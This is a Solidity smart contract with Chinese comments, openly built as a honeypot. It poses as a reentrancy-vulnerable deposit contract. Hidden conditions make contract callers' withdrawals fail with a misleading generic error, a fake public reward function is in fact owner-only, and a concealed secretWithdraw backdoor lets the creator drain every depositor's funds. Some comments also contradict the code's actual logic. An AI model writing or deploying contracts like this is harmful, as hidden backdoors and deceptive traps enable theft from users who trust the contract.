// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title HoneypotContract
 * @dev 一个看似有漏洞但实际上是陷阱的合约
 * 这个合约看起来有一个重入攻击漏洞，但实际上包含隐藏机制阻止攻击者提取资金
 */
contract HoneypotContract {
    mapping(address => uint256) public balances;
    bool private locked; // 隐藏的重入锁
    uint256 private secretThreshold; // 隐藏的阈值
    address private owner;
    
    // 用于记录交易的事件
    event Deposit(address indexed sender, uint256 amount);
    event Withdrawal(address indexed recipient, uint256 amount);
    
    constructor() {
        owner = msg.sender;
        locked = false;
        secretThreshold = 10 ether; // 设置一个隐藏阈值
    }
    
    // 修饰符看起来有漏洞，但实际上有隐藏条件
    modifier noReentrant() {
        // 这个检查看起来可以绕过，但实际上不能
        require(!locked, "Reentrant call detected");
        locked = true;
        _;
        locked = false;
    }
    
    // 允许用户存款
    function deposit() external payable {
        require(msg.value > 0, "Must deposit some ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 看似有漏洞的提款函数
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // 看起来有重入漏洞，先发送ETH再减少余额
        // 但实际上有隐藏的防御机制
        
        // 减少余额
        balances[msg.sender] -= amount;
        
        // 发送ETH - 看起来可能被重入攻击
        (bool success, ) = msg.sender.call{value: amount}("");
        
        // 隐藏的陷阱：如果是合约调用且金额大于阈值，则回滚
        if (isContract(msg.sender) && address(this).balance < secretThreshold) {
            // 这个检查对用户不可见，会导致交易回滚
            // 但错误信息看起来像是交易失败的通用错误
            revert("Transaction failed");
        }
        
        require(success, "Transfer failed");
        emit Withdrawal(msg.sender, amount);
    }
    
    // 检查地址是否为合约
    function isContract(address addr) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
    
    // 看起来是一个漏洞函数，诱使攻击者调用
    function claimReward() external {
        // 看起来任何人都可以调用并获得奖励
        require(address(this).balance > 0, "No rewards available");
        
        // 但实际上有隐藏条件
        require(msg.sender == owner, "Not authorized");
        
        // 转移所有余额给调用者
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    // 隐藏的后门函数，允许创建者提取所有资金
    function secretWithdraw() external {
        require(msg.sender == owner, "Not authorized");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    // 获取合约余额
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
